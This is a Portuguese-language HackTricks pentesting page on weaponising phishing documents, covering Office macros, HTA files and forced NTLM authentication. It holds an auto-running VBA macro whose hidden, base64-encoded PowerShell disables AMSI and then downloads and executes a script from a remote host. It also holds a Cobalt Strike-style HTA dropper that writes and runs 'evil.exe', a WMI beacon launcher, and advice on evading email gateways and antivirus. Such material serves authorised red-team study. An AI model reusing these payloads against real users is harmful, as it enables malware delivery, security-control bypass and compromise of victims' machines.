## Arquivos e Documentos de Phishing

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

## Documentos do Office

O Microsoft Word realiza a validação dos dados do arquivo antes de abri-lo. A validação dos dados é realizada na forma de identificação da estrutura de dados, em conformidade com o padrão OfficeOpenXML. Se ocorrer algum erro durante a identificação da estrutura de dados, o arquivo em análise não será aberto.

Normalmente, arquivos do Word que contêm macros usam a extensão `.docm`. No entanto, é possível renomear o arquivo alterando a extensão do arquivo e ainda manter suas capacidades de execução de macro.\
Por exemplo, um arquivo RTF não suporta macros, por design, mas um arquivo DOCM renomeado para RTF será tratado pelo Microsoft Word e será capaz de executar macros.\
Os mesmos internos e mecanismos se aplicam a todos os softwares do Microsoft Office Suite (Excel, PowerPoint etc.).

Você pode usar o seguinte comando para verificar quais extensões serão executadas por alguns programas do Office:
```bash
assoc | findstr /i "word excel powerp"
```
Arquivos DOCX que fazem referência a um modelo remoto (Arquivo - Opções - Suplementos - Gerenciar: Modelos - Ir) que inclui macros podem "executar" macros também.

### Carregamento de imagem externa

Vá para: _Inserir --> Partes rápidas --> Campo_\
_**Categorias**: Links e Referências, **Nomes de campo**: includePicture, e **Nome do arquivo ou URL**:_ http://\<ip>/qualquercoisa

![](<../../.gitbook/assets/image (316).png>)

### Backdoor de Macros

É possível usar macros para executar código arbitrário a partir do documento.

#### Funções de Autocarregamento

Quanto mais comuns forem, mais provável é que o AV as detecte.

* AutoOpen()
* Document\_Open()

#### Exemplos de Código de Macros
```vba
Sub AutoOpen()
    CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
 .StdIn.WriteLine author
 .StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Remover manualmente metadados

Vá em **Arquivo > Informações > Verificar Documento > Verificar Documento**, o que abrirá o Inspector de Documentos. Clique em **Verificar** e depois em **Remover Tudo** ao lado de **Propriedades do Documento e Informações Pessoais**.

#### Extensão Doc

Quando terminar, selecione o menu suspenso **Salvar como tipo**, altere o formato de **`.docx`** para **Word 97-2003 `.doc`**.\
Faça isso porque você **não pode salvar macros dentro de um `.docx`** e há um **estigma** em torno da extensão macro-habilitada **`.docm`** (por exemplo, o ícone da miniatura tem um enorme `!` e alguns gateways web/email os bloqueiam completamente). Portanto, esta **extensão legada `.doc` é o melhor compromisso**.

#### Geradores de Macros Maliciosas

* MacOS
  * [**macphish**](https://github.com/cldrn/macphish)
  * [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## Arquivos HTA

Um HTA é um programa proprietário do Windows cujo **código-fonte consiste em HTML e uma ou mais linguagens de script** suportadas pelo Internet Explorer (VBScript e JScript). O HTML é usado para gerar a interface do usuário e a linguagem de script para a lógica do programa. Um **HTA é executado sem as restrições do modelo de segurança do navegador**, portanto, é executado como um aplicativo "totalmente confiável".

Um HTA é executado usando o **`mshta.exe`**, que é normalmente **instalado** junto com o **Internet Explorer**, tornando o **`mshta` dependente do IE**. Portanto, se ele foi desinstalado, os HTAs não poderão ser executados.
```html
<--! Basic HTA Execution -->
<html>
  <head>
    <title>Hello World</title>
  </head>
  <body>
    <h2>Hello World</h2>
    <p>This is an HTA...</p>
  </body>

  <script language="VBScript">
    Function Pwn()
      Set shell = CreateObject("wscript.Shell")
      shell.run "calc"
    End Function

    Pwn
  </script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
	Function var_func()
		var_shellcode = "<shellcode>"

		Dim var_obj
		Set var_obj = CreateObject("Scripting.FileSystemObject")
		Dim var_stream
		Dim var_tempdir
		Dim var_tempexe
		Dim var_basedir
		Set var_tempdir = var_obj.GetSpecialFolder(2)
		var_basedir = var_tempdir & "\" & var_obj.GetTempName()
		var_obj.CreateFolder(var_basedir)
		var_tempexe = var_basedir & "\" & "evil.exe"
		Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
		For i = 1 to Len(var_shellcode) Step 2
		    var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
		Next
		var_stream.Close
		Dim var_shell
		Set var_shell = CreateObject("Wscript.Shell")
		var_shell.run var_tempexe, 0, true
		var_obj.DeleteFile(var_tempexe)
		var_obj.DeleteFolder(var_basedir)
	End Function

	var_func
	self.close
</script>
```
## Forçando a Autenticação NTLM

Existem várias maneiras de **forçar a autenticação NTLM "remotamente"**, por exemplo, você pode adicionar **imagens invisíveis** a e-mails ou HTML que o usuário acessará (até mesmo HTTP MitM?). Ou enviar para a vítima o **endereço de arquivos** que irão **disparar** uma **autenticação** apenas para **abrir a pasta**.

**Confira essas ideias e mais nas seguintes páginas:**

{% content-ref url="../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md" %}
[places-to-steal-ntlm-creds.md](../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md)
{% endcontent-ref %}

### NTLM Relay

Não se esqueça que você não só pode roubar o hash ou a autenticação, mas também **realizar ataques de relé NTLM**:

* [**Ataques de relé NTLM**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
* [**AD CS ESC8 (relé NTLM para certificados)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
